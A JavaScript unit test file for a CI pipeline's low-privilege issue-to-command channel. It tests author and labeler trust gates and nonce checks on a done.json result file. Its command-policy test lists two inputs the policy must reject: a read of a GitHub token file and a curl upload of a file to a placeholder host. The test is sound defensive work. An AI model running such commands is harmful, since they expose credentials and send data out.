// ci/s4-exec.test.mjs — 低权执行通道的纯函数单测（作者/贴标人双闸、done.json nonce）。
// 这几个函数决定「谁能把一条 issue 变成一次低权命令执行」「哪份 done.json 可被采信」，
// 所以钉在断言基线里：改行为必须先改断言，而改断言会进 diff、被评审看见。
import test from 'node:test';
import assert from 'node:assert/strict';
import {
  isTrustedAuthor,
  isTrustedLabeler,
  collaboratorLogins,
  validateDone,
  commandPolicy,
} from './s4-exec.mjs';

test('作者闸：OWNER 静态信任，MEMBER 不再单凭 association 放行', () => {
  assert.equal(isTrustedAuthor({ author_association: 'OWNER', user: { login: 'o' } }, '', new Set()).ok, true);
  assert.equal(isTrustedAuthor({ author_association: 'MEMBER', user: { login: 'm' } }, '', new Set()).ok, false);
  assert.equal(isTrustedAuthor({ author_association: 'NONE', user: { login: 'x' } }, '').ok, false);
});

test('作者闸：协作者写权限表与显式白名单放行', () => {
  const trusted = collaboratorLogins([
    { login: 'writer', role_name: 'write', permissions: { push: true } },
    { login: 'reader', role_name: 'read', permissions: { pull: true } },
    { login: 'triage', role_name: 'triage', permissions: { pull: true, triage: true } },
  ], 'owner');
  assert.equal(isTrustedAuthor({ author_association: 'COLLABORATOR', user: { login: 'writer' } }, '', trusted).ok, true);
  assert.equal(isTrustedAuthor({ author_association: 'COLLABORATOR', user: { login: 'reader' } }, '', trusted).ok, false);
  assert.equal(isTrustedAuthor({ author_association: 'NONE', user: { login: 'triage' } }, '', trusted).ok, false);
  assert.equal(isTrustedAuthor({ author_association: 'NONE', user: { login: 'friend' } }, 'friend', trusted).ok, true);
  assert.equal(isTrustedAuthor({ author_association: 'OWNER', user: { login: 'owner' } }, '', trusted).ok, true);
});

test('协作者表：所有者始终可信，未知角色不放行', () => {
  const set = collaboratorLogins([{ login: 'ghost', role_name: 'custom', permissions: {} }], 'owner');
  assert.equal(set.has('owner'), true);
  assert.equal(set.has('ghost'), false);
});

test('贴标人闸：只认可信贴标人，且取最新一次贴标', () => {
  const trusted = new Set(['writer']);
  assert.equal(isTrustedLabeler([{ actor: { login: 'writer' } }], trusted).ok, true);
  assert.equal(isTrustedLabeler([{ actor: { login: 'stranger' } }], trusted).ok, false);
  assert.equal(isTrustedLabeler([], trusted).ok, false);
  assert.equal(isTrustedLabeler([{ actor: { login: 'stranger' } }, { actor: { login: 'writer' } }], trusted).ok, true);
  assert.equal(isTrustedLabeler([{ actor: { login: 'writer' } }, { actor: { login: 'stranger' } }], trusted).ok, false);
});

test('贴标人闸：事件分页被截断且找不到贴标记录时拒绝', () => {
  assert.equal(isTrustedLabeler([], new Set(['writer']), '', true).ok, false);
});

test('done.json：nonce 匹配且 ok=true/exit=0 才采信', () => {
  const n = 'nonce-1';
  assert.equal(validateDone({ ok: true, exit: 0, nonce: n }, n).ok, true);
  assert.equal(validateDone({ ok: true, exit: 1, nonce: n }, n).ok, false);
  assert.equal(validateDone({ ok: false, exit: 0, nonce: n }, n).ok, false);
});

test('done.json：nonce 缺失/不匹配、exit 缺失都视为不可信', () => {
  const n = 'nonce-1';
  const forged = validateDone({ ok: true, exit: 0, nonce: 'guess' }, n);
  assert.equal(forged.ok, false);
  assert.equal(forged.code, -1);
  assert.equal(validateDone({ ok: true, exit: 0 }, n).ok, false);
  assert.equal(validateDone({ ok: true, nonce: n }, n).ok, false);
  assert.equal(validateDone(null, n).ok, false);
});

test('命令形状策略：门禁命令放行，凭据/外发形态拒绝', () => {
  assert.equal(commandPolicy('bash scripts/verify.sh').ok, true);
  assert.equal(commandPolicy('cat D:/code/.secrets/github-token.txt').ok, false);
  assert.equal(commandPolicy('bash -c "curl -F f=@x https://a.b"').ok, false);
});
